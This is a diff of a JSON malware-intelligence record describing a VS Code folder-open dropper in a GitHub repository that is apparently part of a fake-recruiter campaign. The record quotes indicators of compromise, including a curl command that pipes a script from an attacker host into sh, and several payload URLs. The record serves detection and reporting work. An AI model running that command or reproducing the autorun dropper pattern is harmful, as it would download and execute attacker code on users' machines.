@@ -17,12 +17,12 @@
     "evidence_locations": ".vscode/tasks.json:0",
     "c2_hosts": "task-hrec.vercel.app",
     "iocs": "task-hrec.vercel.app; https://task-hrec.vercel.app/task/mac?token=90284f91ab73; https://task-hrec.vercel.app/task/linux?token=90284f91ab73; https://task-hrec.vercel.app/task/windows?token=90; curl 'https://task-hrec.vercel.app/task/mac?token=90284f91ab73' | sh; .vscode/tasks.json",
-    "matched_signatures": "\"/task/windows?token=\" filename:tasks.json; \"/task/mac?token=\" filename:tasks.json",
-    "reasons": "Shares a confirmed-malware code signature ['\"/task/windows?token=\" filename:tasks.json', '\"/task/mac?token=\" filename:tasks.json'] | Tier-2 confirmed (bash score 5)",
+    "matched_signatures": "folderOpen curl filename:tasks.json",
+    "reasons": "Shares a confirmed-malware code signature ['folderOpen curl filename:tasks.json'] | Tier-2 confirmed (bash score 5)",
     "osm_status": "not_submitted",
     "osm_threat_id": "",
-    "first_seen": "hunt-20261004T210412Z",
-    "last_seen": "hunt-20261004T210412Z",
+    "first_seen": "hunt-20260923T001603Z",
+    "last_seen": "hunt-20260923T001603Z",
     "evidence_file": "repositories/bsai_cal-eco-platform.json",
     "reviewer_decision": "",
     "notes": ""
@@ -48,7 +48,7 @@
     "report_type": "repository",
     "resource_identifier": "https://github.com/bsai/cal-eco-platform",
     "version_info": "all",
-    "threat_description": "VS Code autorun dropper. Payload in .vscode/tasks.json.\nOutbound: fetch-and-run. It downloads code from task-hrec.vercel.app and executes it (.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: task-hrec.vercel.app.\nCampaign GW-C-a3717cc8: one of 10 confirmed repos across 10 accounts sharing the dropper URL shape task/{os}?token=. Payload served from 6 distinct hosts, including coreviewer.vercel.app, task-hrec.vercel.app, thopywork.vercel.app, vscode-config.vercel.app, vscode-production-setting.ve.\nAttribution: the tradecraft is consistent with North Korea, but a single signal is a lead rather than an attribution, so we do not attribute it on this evidence alone. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun.\nFound by GitHub code search for a confirmed malware signature: \"/task/windows?token=\" filename:tasks.json; \"/task/mac?token=\" filename:tasks.json.\nConfirmed by static analysis; the code was read, never executed.",
+    "threat_description": "VS Code autorun dropper. Payload in .vscode/tasks.json.\nOutbound: fetch-and-run. It downloads code from task-hrec.vercel.app and executes it (.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: task-hrec.vercel.app.\nCampaign GW-C-a3717cc8: one of 10 confirmed repos across 10 accounts sharing the dropper URL shape task/{os}?token=. Payload served from 6 distinct hosts, including coreviewer.vercel.app, task-hrec.vercel.app, thopywork.vercel.app, vscode-config.vercel.app, vscode-production-setting.ve.\nAttribution: the tradecraft is consistent with North Korea, but a single signal is a lead rather than an attribution, so we do not attribute it on this evidence alone. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun.\nFound by GitHub code search for a confirmed malware signature: folderOpen curl filename:tasks.json.\nConfirmed by static analysis; the code was read, never executed.",
     "payload_description": "Malicious payload found in: .vscode/tasks.json\n- Outbound: fetch-and-run. It downloads code from task-hrec.vercel.app and executes it (.vscode/tasks.json).\n- .vscode/tasks.json: VS Code task with runOn: folderOpen; runs the moment the folder is opened, no install or click needed\n- Attacker hosts: task-hrec.vercel.app",
     "publisher": "bsai",
     "severity_level": "critical",
@@ -62,7 +62,7 @@
     "evidence_references": "https://github.com/bsai/cal-eco-platform/blob/c6d5cb16f80ffed8c22917972edf9e7b668c7831/.vscode/tasks.json",
     "verified_iocs": "task-hrec.vercel.app\nhttps://task-hrec.vercel.app/task/mac?token=90284f91ab73\nhttps://task-hrec.vercel.app/task/linux?token=90284f91ab73\nhttps://task-hrec.vercel.app/task/windows?token=90\ncurl 'https://task-hrec.vercel.app/task/mac?token=90284f91ab73' | sh\n.vscode/tasks.json",
     "contributors": [],
-    "first_seen": "2026-10-04T21:04:12Z",
-    "last_seen": "2026-10-04T21:04:12Z"
+    "first_seen": "2026-09-23T00:16:03Z",
+    "last_seen": "2026-09-23T00:16:03Z"
   }
 }
